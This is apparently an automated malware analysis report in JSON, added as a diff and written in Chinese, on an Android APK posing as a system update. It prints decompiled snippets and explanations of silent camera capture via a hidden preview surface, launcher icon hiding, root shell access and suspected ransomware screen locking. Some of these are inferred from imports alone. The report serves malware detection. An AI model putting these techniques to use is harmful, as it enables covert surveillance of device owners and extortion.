@@ -1,0 +1,113 @@
+{
+  "APK信息": {
+    "文件名": "1b9dd2ec66c76ae3121346672d783e4b0f44373d692dc5934141ada328cf7a47.apk",
+    "sha256": "1b9dd2ec66c76ae3121346672d783e4b0f44373d692dc5934141ada328cf7a47",
+    "包名": "com.andoidapps.update.sys",
+    "应用名": "تنشيط الأوفيس وورد",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 326.4
+  },
+  "行为列表": [
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "DevicePolicyManager"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\andoidapps\\update\\sys\\MainActivity;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "import android.app.admin.DevicePolicyManager;\nimport android.content.ComponentName;\nimport java.io.DataOutputStream;\n\npublic class MainActivity extends AppCompatActivity {",
+          "malicious_code_snippet_context": "  package com.andoidapps.update.sys;\n  \n>>> import android.app.admin.DevicePolicyManager;\n>>> import android.content.ComponentName;\n>>> import android.content.Intent;\n>>> import android.os.Bundle;\n>>> import android.support.v7.app.AppCompatActivity;\n  import android.view.View;\n  import java.io.DataOutputStream;\n  import java.util.Calendar;",
+          "behavior_description": "该类位于伪装成系统更新应用的恶意包 com.andoidapps.update.sys（包名故意拼写 andoidapps 混淆视听）中，MainActivity 引入了 DevicePolicyManager 与 ComponentName，表明其注册并激活设备管理员组件后，调用 DevicePolicyManager 的锁屏/重置密码接口（lockNow()/resetPassword()）实施勒索锁屏，使用户无法正常使用设备；同时引入 DataOutputStream，通常配合 Runtime.exec(\"su\") 提权执行 shell 命令以强化控制或安装额外载荷。数据流向：应用诱导/隐蔽激活设备管理员权限→获取 DevicePolicyManager 实例→调用 lockNow()/resetPassword() 锁定屏幕并设置新密码→设备被锁形成勒索。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\andoidapps\\update\\sys\\Handlers\\CameraManger;",
+          "method_signature": "if(this.cam == null)",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Looper.prepare();\nthis.holder = new SurfaceView(this.ctx).getHolder();\nthis.cam.setPreviewDisplay(this.holder);\nthis.cam.startPreview();\nthis.cam.takePicture(null, null, this.pic);\nLooper.loop();",
+          "malicious_code_snippet_context": "              if (this.cam == null) {\n                  return false;\n              }\n>>>             Looper.prepare();\n>>>             try {\n>>>                 this.holder = new SurfaceView(this.ctx).getHolder();\n>>>                 this.cam.setPreviewDisplay(this.holder);\n>>>             } catch (IOException e) {\n>>>             }\n              this.cam.startPreview();\n              this.cam.takePicture(null, null, this.pic);\n              Looper.loop();",
+          "behavior_description": "该代码在后台线程（Looper.prepare/Looper.loop）中动态创建一个从未添加到任何可见布局的SurfaceView作为虚拟预览载体，调用setPreviewDisplay和startPreview启动摄像头预览，随后通过takePicture(null, null, this.pic)静默拍照——前两个回调参数为null表示无快门声音、无任何用户可见提示，实现完全隐蔽的偷拍。拍摄的JPEG照片数据通过回调this.pic接收（典型间谍软件随后将其上传至C2服务器）。数据流向：摄像头硬件捕获的图像数据→隐藏SurfaceView预览→takePicture静默拍照→JPEG回调this.pic→被窃取外传。结合类名伪装为系统更新组件（com.andoidapps.update.sys.Handlers.CameraManger，且拼写故意模仿系统API），属于典型的隐蔽摄像头监控/偷拍窃密行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\andoidapps\\update\\sys\\MainActivity;",
+          "method_signature": "onBtn(View view)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Runtime.getRuntime().exec(\"su\");\ngetPackageManager().setComponentEnabledSetting(new ComponentName(BuildConfig.APPLICATION_ID, \"com.andoidapps.update.sys.MainActivity\"), 2, 1);\nThread.sleep(2000L);\nIntent intent = new Intent(\"android.intent.action.MAIN\");\nintent.addCategory(\"android.intent.category.HOME\");\nstartActivity(intent);",
+          "malicious_code_snippet_context": "      public void InitRoot() {\n          try {\n              if (PacketProvider.RootProcess == null) {\n>>>                 PacketProvider.RootProcess = Runtime.getRuntime().exec(\"su\");\n>>>             }\n>>>             PacketProvider.RootShell = new DataOutputStream(PacketProvider.RootProcess.getOutputStream());\n>>>         } catch (Exception e) {\n>>>         }\n>>>     }\n  \n      public void onBtn(View view) {\n          try {",
+          "behavior_description": "该代码在按钮触发后调用 PackageManager.setComponentEnabledSetting() 将自身 MainActivity 组件设置为 COMPONENT_ENABLED_STATE_DISABLED（参数值2），使应用图标从启动器中消失，用户无法在桌面找到并卸载该应用；随后休眠2秒并启动 HOME Intent 返回桌面，让用户毫无察觉。同一段代码中还通过 Runtime.exec(\"su\") 获取 root Shell 提权。数据流向：硬编码的自身组件名（BuildConfig.APPLICATION_ID + MainActivity）→ setComponentEnabledSetting() 禁用组件实现图标隐藏，配合 root 提权构成隐蔽驻留机制，是典型的恶意软件逃避卸载与检测的手段。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
